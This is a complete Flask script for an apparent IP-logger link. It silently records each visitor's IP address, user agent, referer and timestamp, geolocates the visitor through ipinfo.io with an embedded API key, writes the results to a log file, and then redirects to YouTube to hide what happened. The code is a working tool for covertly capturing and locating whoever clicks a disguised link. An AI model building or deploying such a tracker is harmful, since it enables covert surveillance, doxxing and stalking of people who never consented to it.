from flask import Flask, request, redirect
import datetime
import requests

app = Flask(__name__)

LOG_FILE = 'ip_logs.txt'
IPINFO_API_KEY = 'b63f20e2505b2e'  

def get_public_ip():
    
    public_ip = request.remote_addr
    if public_ip == '127.0.0.1':
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            public_ip = response.json()['ip']
    return public_ip

@app.route('/')
def track():
    ip_address = get_public_ip()
    user_agent = request.headers.get('User-Agent')
    referer = request.headers.get('Referer', 'None')
    method = request.method
    timestamp = datetime.datetime.now().isoformat()

    geo_info = get_geolocation(ip_address)
    if geo_info:
        city = geo_info.get('city', 'N/A')
        region = geo_info.get('region', 'N/A')
        country = geo_info.get('country', 'N/A')
    else:
        city = region = country = 'N/A'
    with open(LOG_FILE, 'a') as f:
        f.write(f"{ip_address},{user_agent},{referer},{method},{timestamp},{city},{region},{country}\n")

    return redirect('https://youtube.com')

def get_geolocation(ip_address):
    response = requests.get(f'https://ipinfo.io/{ip_address}/json?token={IPINFO_API_KEY}')
    if response.status_code == 200:
        return response.json()
    return None

if __name__ == '__main__':
    app.run(debug=True)
